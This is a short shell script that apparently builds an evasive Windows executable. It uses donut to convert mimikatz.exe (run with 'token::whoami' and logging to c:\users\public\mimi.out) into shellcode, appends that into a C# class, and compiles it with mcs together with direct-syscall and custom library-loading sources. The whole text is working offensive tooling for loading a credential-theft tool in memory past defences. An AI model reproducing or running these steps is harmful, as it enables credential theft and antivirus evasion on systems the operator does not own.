cp Program.cs test.cs
echo 'public static class Global {' >> test.cs
echo -n 'public static ' >> test.cs
donut -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"' ../mimikatz/Win32/mimikatz.exe  -f 7 -o mimi.cs
cat mimi.cs >> test.cs
echo '}' >> test.cs
mcs -optimize- -platform:x86 -unsafe -out:test.exe test.cs NativeSysCall.cs Natives.cs CustomLoadLibrary.cs